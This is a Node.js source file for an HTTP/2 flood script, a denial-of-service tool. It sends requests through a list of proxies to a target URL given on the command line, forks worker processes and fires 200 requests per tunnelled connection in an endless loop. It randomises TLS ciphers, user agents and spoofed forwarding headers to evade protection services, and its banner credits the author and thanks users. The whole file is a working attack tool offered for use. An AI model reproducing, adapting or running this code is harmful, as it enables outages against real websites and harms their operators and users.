const url = require("url"),
    fs = require("fs"),
    http2 = require("http2"),
    http = require("http"),
    tls = require("tls"),
    net = require("net"),
    cluster = require("cluster"),
    fakeua = require("fake-useragent"),
    cplist = ["ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"],
    accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8", "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*", "text/html, application/xhtml+xml, image/jxr, */*", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1", "application/javascript, */*;q=0.8", "text/html, text/plain; q=0.6, */*; q=0.1", "application/graphql, application/json; q=0.8, application/xml; q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"],
    lang_header = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9", "de-CH;q=0.7", "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5"],
    encoding_header = ["gzip, deflate", "br;q=1.0, gzip;q=0.8, *;q=0.1", "gzip", "gzip, compress", "compress, deflate", "compress", "gzip, deflate, br", "deflate"],
    controle_header = ["max-age=604800", "no-cache", "no-store", "no-transform", "only-if-cached", "max-age=0", "no-cache, no-store,private, max-age=0, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", "no-cache, no-store,private, max-age=604800, must-revalidate"],
    ignoreNames = ["RequestError", "StatusCodeError", "CaptchaError", "CloudflareError", "ParseError", "ParserError"],
    ignoreCodes = ["SELF_SIGNED_CERT_IN_CHAIN", "ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED", "EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "ESOCKETTIMEDOUT", "EPROTO"];
process.on("uncaughtException", function(mathison) {
    if (mathison.code && ignoreCodes.includes(mathison.code) || mathison.name && ignoreNames.includes(mathison.name)) {
        return false;
    }
}).on("unhandledRejection", function(pearletta) {
    if (pearletta.code && ignoreCodes.includes(pearletta.code) || pearletta.name && ignoreNames.includes(pearletta.name)) {
        return false;
    }
}).on("warning", arseniy => {
    if (arseniy.code && ignoreCodes.includes(arseniy.code) || arseniy.name && ignoreNames.includes(arseniy.name)) {
        return false;
    }
}).setMaxListeners(0);
const target = process.argv[2],
    time = process.argv[3],
    thread = process.argv[4],
    proxys = fs.readFileSync(process.argv[5], "utf-8").toString().match(/\S+/g);
if (cluster.isMaster) {
    const dateObj = new Date;
    console.log("[31mURL: [37m" + url.parse(target).host + "\n[31mThread: [41m" + thread + "\n[36mTime: [37m" + time + "\n[36mSCRIPT BY : [38;5;49m$TrongThao Official <3 Thanks for use my script <3 \n BEST SCRIPT ! MANG DI BAN LAM SUC VAT CA DOI ! ");
    for (var bb = 0; bb < thread; bb++) {
        cluster.fork();
    }
    setTimeout(() => {
        process.exit(-1);
    }, time * 1e3);
} else {
    function flood() {
        var kameren = url.parse(target);
        const dakayla = fakeua();
        var mylashia = cplist[Math.floor(Math.random() * cplist.length)],
            dnesha = proxys[Math.floor(Math.random() * proxys.length)].split(":"),
            sannon = {
                ":path": kameren.path,
                "X-Forwarded-For": dnesha[0],
                "X-Forwarded-Host": dnesha[0],
                ":method": "GET",
                "User-agent": dakayla,
                Origin: target,
                Accept: accept_header[Math.floor(Math.random() * accept_header.length)],
                "Accept-Encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
                "Accept-Language": lang_header[Math.floor(Math.random() * lang_header.length)],
                "Cache-Control": controle_header[Math.floor(Math.random() * controle_header.length)]
            };
        const kawuan = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 2e4,
            maxSockets: 0
        });
        var corinthia = http.request({
            host: dnesha[0],
            agent: kawuan,
            globalAgent: kawuan,
            port: dnesha[1],
            headers: {
                Host: kameren.host,
                "Proxy-Connection": "Keep-Alive",
                Connection: "Keep-Alive"
            },
            method: "CONNECT",
            path: kameren.host + ":443"
        }, function() {
            corinthia.setSocketKeepAlive(true);
        });
        corinthia.on("connect", function(latonja, lassana, mahyar) {
            const makiya = http2.connect(kameren.href, {
                createConnection: () => tls.connect({
                    host: kameren.host,
                    ciphers: mylashia,
                    secureProtocol: "TLS_method",
                    TLS_MIN_VERSION: "1.2",
                    TLS_MAX_VERSION: "1.3",
                    servername: kameren.host,
                    secure: true,
                    rejectUnauthorized: false,
                    ALPNProtocols: ["h2"],
                    socket: lassana
                }, function() {
                    for (let srithan = 0; srithan < 200; srithan++) {
                        const uziah = makiya.request(sannon);
                        uziah.setEncoding("utf8");
                        uziah.on("data", gaella => {});
                        uziah.on("response", () => {
                            uziah.close();
                        });
                        uziah.end();
                    }
                })
            });
        });
        corinthia.end();
    }
    setInterval(() => {
        flood();
    });
}